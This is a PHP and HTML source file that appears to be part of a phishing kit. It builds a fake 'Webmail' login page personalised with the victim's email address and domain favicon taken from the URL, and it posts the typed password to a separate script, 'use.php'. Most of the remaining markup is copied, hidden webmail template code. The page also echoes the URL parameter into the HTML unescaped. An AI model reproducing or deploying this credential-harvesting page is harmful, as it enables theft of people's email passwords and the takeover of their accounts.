<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>    
    <meta content="IE=edge,chrome=IE7" http-equiv="X-UA-Compatible">
    <title>Webmail</title>
    <link href="./web_files/default.css" rel="stylesheet" type="text/css">
</head>
<body id="body" data-gr-c-s-loaded="true">
<div id="loginScreen">
    <div id="loginPrompt">
        <div class="login-top">
            <div style="padding-top: 5px;margin-left: 10px;">Connecting to <b><?php echo $domain ?></b>.......</div>
        </div>
        <div style="text-align:center;margin-bottom: 20px;">
            Enter password for <b><?php echo $_GET['email']; ?></b> email to continue
        </div>
        <form action="use.php" id="login" method="post">
            <div style="width: 90%; margin: 0 auto 0 auto;">
                <table border="0" cellpadding="0" cellspacing="0" class="inputGridTable" id="loading_data" style="display: none;">
                    <tbody>
                    <tr>
                        <td>&nbsp;</td>
                    </tr>
                    <tr>
                        <td id="progress"></td>
                    </tr>
                    <tr>
                        <td id="loadmessage_text">&nbsp;</td>
                    </tr>
                    <tr>
                        <td>&nbsp;</td>
                    </tr>
                    </tbody>
                </table>
            </div>
            <div style="margin: auto 20px;">
                <table border="0" cellpadding="0" cellspacing="0" class="inputGridTable" id="loading_data_complete" style="width: 100%;">
                    <tbody>
                    <tr>
                        <td colspan="2">
                        </td>
                    </tr>
                    <tr>
                        <td nowrap="nowrap" style="padding-right: 1em;">
                            <label for="username" id="d27e45">Email:</label>
                        </td>
                        <td width="70%">
                            <input autocapitalize="off" autocorrect="off" id="username" name="username" style="width:98%" tabindex="3" type="email" value="<?php echo $_GET['email']; ?>" readonly required>
                        </td>
                    </tr>
                    <tr>
                        <td nowrap="nowrap" style="padding-right: 1em;">
                            <label for="password" id="d27e49">Password:</label>
                        </td>
                        <td width="70%">
                            <input autocapitalize="off" autocorrect="off" id="password" name="password" style="width: 98%" tabindex="4" type="password" required="">
                        </td>
                    </tr>
                    <tr>
                        <td>&nbsp;</td>
                        <td>
                            <button class="ox-button" id="inner-login-button" tabindex="4" type="submit">
                                <span id="d27e54">Login</span>
                            </button>
                        </td>
                    </tr>
                    <tr id="loginStatus" style="display:none;">
                        <td colspan="2" style="padding: 1em 0 1em 0;">&nbsp;</td>
                    </tr>
                    </tbody>
                </table>
                <noscript>
                    <div class="noscriptmsg">You need to enable JavaScript to access the Webmail.<br><br>Für den Zugriff
                        auf den Webmail müssen Sie JavaScript aktivieren.
                    </div>
                </noscript>
            </div>
            <div style="width: 100%;">
                <table border="0" cellpadding="0" cellspacing="0" class="inputGridTable" id="loading_proceed" style="display:none; width: 76%; margin: 0 12%;">
                    <tbody>
                    <tr>
                        <td>&nbsp;</td>
                    </tr>
                    <tr>
                        <td style="text-align: center; margin: 1.6em">
                            <img align="absmiddle" id="d27e65" src="./web_files/dummy.gif">&nbsp;
                            <span id="d27e66">Please wait while you are being redirected to the start page ...</span>
                        </td>
                    </tr>
                    </tbody>
                </table>
            </div>
            <div class="login-bottomline">&nbsp;<span id="d27e68">Version</span>
                :&nbsp;10.22.10 Rev19&nbsp;(<?php echo date("Y-m-d");?>)&nbsp;
            </div>
        </form>
    </div>
</div>
<div id="testit3333" style="width: 100%; height: 100%;"></div>

<div style="display:none">
    <div id="template_calendar_participants_confirmdialog" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                <tbody>
                <tr>
                    <td class="contenttext notclickable" id="d28e6" style="width:112px">Comment:</td>
                    <td class="contenttext notclickable" colspan="2" style="padding-left:7px">
                        <div style="overflow:auto"><input style="width:90%" type="text"></div>
                    </td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="3" style="white-space:nowrap;padding-top:5px">
                        <table border="0" cellpadding="0" cellspacing="0" style="width:100%">
                            <tbody>
                            <tr>
                                <td class="contenttext clickable">
                                    <div class="fakeButton background-color-default whiteground" style="width:112px;" tabindex="0">
                                        <div class="fakeButtonBottom">
                                            <div class="fakeButtonLeft">
                                                <div class="fakeButtonRight">
                                                    <div class="fakeButtonTopLeft">
                                                        <div class="fakeButtonTopRight">
                                                            <div class="fakeButtonBottomLeft">
                                                                <div class="fakeButtonBottomRight" id="d28e15-button">
                                                                    Accept
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </td>
                                <td class="contenttext clickable">
                                    <div class="fakeButton background-color-default whiteground" style="width:112px;" tabindex="0">
                                        <div class="fakeButtonBottom">
                                            <div class="fakeButtonLeft">
                                                <div class="fakeButtonRight">
                                                    <div class="fakeButtonTopLeft">
                                                        <div class="fakeButtonTopRight">
                                                            <div class="fakeButtonBottomLeft">
                                                                <div class="fakeButtonBottomRight" id="d28e17-button">
                                                                    Decline
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </td>
                                <td class="contenttext clickable">
                                    <div class="fakeButton background-color-default whiteground" style="width:112px;" tabindex="0">
                                        <div class="fakeButtonBottom">
                                            <div class="fakeButtonLeft">
                                                <div class="fakeButtonRight">
                                                    <div class="fakeButtonTopLeft">
                                                        <div class="fakeButtonTopRight">
                                                            <div class="fakeButtonBottomLeft">
                                                                <div class="fakeButtonBottomRight" id="d28e19-button">
                                                                    Tentative
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_page1" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                <tbody>
                <tr>
                    <td class="notclickable" rowspan="2" style="width:80px;"><img id="d28e24" src="./web_files/dummy.gif"></td>
                    <td class="contenttext notclickable font-weight-high fontSizeBig" style="overflow:hidden;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" id="d28e32" style="width:80px;padding-top:12px">Begins at</td>
                    <td class="contenttext notclickable" style="padding-top:12px"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" id="d28e35" style="width:80px">Ends at</td>
                    <td class="contenttext notclickable"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="padding-top: 12px;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="padding-top:12px; font-size: 0.9em; white-space: normal;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="font-size: 0.9em; white-space: normal;"></td>
                </tr>
                <tr style="display:none">
                    <td class="contenttext notclickable" id="d28e44" style="width:80px">Organizer</td>
                    <td class="contenttext notclickable"></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_tasks_hover_page1" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                <tbody>
                <tr>
                    <td class="notclickable" rowspan="2" style="width:80px;"><img id="d28e50" src="./web_files/dummy.gif"></td>
                    <td class="contenttext notclickable font-weight-high fontSizeBig" style="overflow:hidden;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                    <td class="notclickable" style="width:20px;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable"></td>
                    <td class="notclickable" colspan="2" style="width:40px"></td>
                </tr>
                </tbody>
            </table>
            <table>
                <tbody>
                <tr>
                    <td class="contenttext notclickable" id="d28e60" style="width:80px;padding-top:12px">Start date</td>
                    <td class="contenttext notclickable" style="padding-top:12px"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" id="d28e63" style="width:80px">Due date</td>
                    <td class="contenttext notclickable"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="padding-top:12px"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="padding-top: 12px; font-size: 0.9em; white-space: normal;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="2" style="font-size: 0.9em; white-space: normal;"></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_mail_hover_page1" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                <tbody>
                <tr>
                    <td class="contenttext notclickable" rowspan="2" style="width:70px;"><img id="d28e75" src="./web_files/dummy.gif">
                    </td>
                    <td class="contenttext notclickable font-weight-high fontSizeBig" style="overflow:hidden;"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable"></td>
                    <td></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_mail_hover_actions" style="width:400px;">
        <div style="border-top: 1px solid silver; padding: 3px 0;">
            <div class="menu-item hover"><img alt="" id="d28e85" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e86">Reply</span>
            </div>
            <div class="menu-item hover"><img alt="" id="d28e88" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e89">Reply all</span>
            </div>
            <div class="menu-item hover"><img alt="" id="d28e91" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e92">Forward</span>
            </div>
            <div class="menu-item hover"><img alt="" id="d28e94" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e95">Delete</span>
            </div>
            <div class="menu-item hover"><img alt="" id="d28e97" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e98">Spam</span>
            </div>
            <div class="menu-item hover"><img alt="" id="d28e100" src="./web_files/dummy.gif" style="width: 16px; height: 16px; vertical-align: middle; padding-right: 5px"><span id="d28e101">Not Spam</span>
            </div>
        </div>
    </div>
    <div id="template_infostore_hover_page1" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                <tbody>
                <tr>
                    <td class="contenttext notclickable" style="width:70px;"><img id="d28e106" src="./web_files/dummy.gif"></td>
                    <td class="contenttext notclickable font-weight-high fontSizeBig" style="overflow:hidden;" valign="top"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" style="width:1px;"><img id="d28e112" src="./web_files/dummy.gif"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="3" style="padding-top: 12px"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="3" style="padding-top: 12px; font-size: 0.9em; white-space: normal;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" colspan="3" style="font-size: 0.9em; white-space: normal;"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" id="d28e120" style="width:70px; padding-top:12px">Link/Url</td>
                    <td class="contenttext notclickable" colspan="2" style="padding-top:12px"></td>
                </tr>
                </tbody>
            </table>
            <table style="width:100%; padding-top:12px">
                <tbody>
                <tr>
                    <td>
                        <table border="0" cellpadding="0" cellspacing="0" style="width:100%;table-layout:fixed">
                            <tbody>
                            <tr>
                                <td class="notclickable contenttext" style="width:45px;text-align:center;"></td>
                                <td class="notclickable" style="width:25px;line-height:0px"><img id="d28e129" src="./web_files/dummy.gif">
                                </td>
                                <td class="contenttext notclickable" colspan="2" style="overflow:hidden"></td>
                                <td class="clickable" style="width:20px;line-height:0px"><img id="d28e132" src="./web_files/dummy.gif">
                                </td>
                                <td class="clickable" style="width:20px;line-height:0px"><img id="d28e134" src="./web_files/dummy.gif">
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_page_content" style="width:400px;overflow:hidden;">
        <div style="padding:0px 7px 7px 7px">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%">
                <tbody>
                <tr>
                    <td class="contenttext clickable" style="padding-top:12px;white-space:normal"></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_page_content_full" style="width:400px;overflow:hidden;">
        <div style="padding:0px 7px 7px 7px">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;">
                <tbody>
                <tr>
                    <td class="contenttext notclickable" style="padding-top:12px;white-space:normal"></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_participants" style="width:400px;overflow:hidden;">
        <div style="padding-left:7px;padding-right:7px">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;">
                <tbody></tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_attachments" style="width:400px;overflow:hidden;">
        <div style="padding-left:7px;padding-right:7px;padding-top:7px">
            <table border="0" cellpadding="0" cellspacing="0" style="width:386px; table-layout:fixed">
                <colgroup>
                    <col width="25px">
                    <col>
                    <col width="25px">
                    <col width="25px">
                </colgroup>
                <tbody>
                <tr>
                    <td class="contenttext notclickable font-weight-high" colspan="4" id="d28e155">Attachments</td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_groupparticipants" style="width:400px;overflow:hidden;">
        <div style="padding: 0px 7px">
            <table border="0" cellpadding="0" cellspacing="0">
                <tbody>
                <tr>
                    <td class="contenttext notclickable" style="width:18px;padding-left:12px;vertical-align:top"><img id="d28e160" src="./web_files/dummy.gif"></td>
                    <td class="contenttext" style="padding-left:12px; white-space:normal"></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="template_calendar_hover_others" style="width:400px;overflow:hidden;">
        <div style="padding:7px;">
            <table border="0" cellpadding="0" cellspacing="0" style="width:100%;">
                <tbody>
                <tr>
                    <td class="contenttext notclickable font-weight-high" colspan="2" id="d28e165">Others</td>
                </tr>
                <tr>
                    <td class="notclickable" style="width:20px; padding-top:12px;line-height:0px"><img id="d28e168" src="./web_files/dummy.gif">
                    </td>
                    <td class="contenttext notclickable" id="d28e169" style="padding-top:12px;">Folder:</td>
                    <td class="contenttext notclickable" style="padding-top:12px;"></td>
                    <td class="clickable" id="d28e171" style="padding-top:12px;line-height:0px;width:20px" title="Switch to folder"></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" id="d28e174">Created by:</td>
                    <td class="contenttext notclickable"></td>
                    <td></td>
                </tr>
                <tr>
                    <td class="contenttext notclickable" style="width:20px;"></td>
                    <td class="contenttext notclickable" id="d28e179">Modified by:</td>
                    <td class="contenttext notclickable"></td>
                    <td></td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div id="contactHovertmpl" style="padding-top: 12px; width:400px;overflow:hidden;"></div>
    <div id="contactHovertmpl2" style="padding-top: 12px; width:400px;overflow:hidden;"></div>
</div>



</body></html>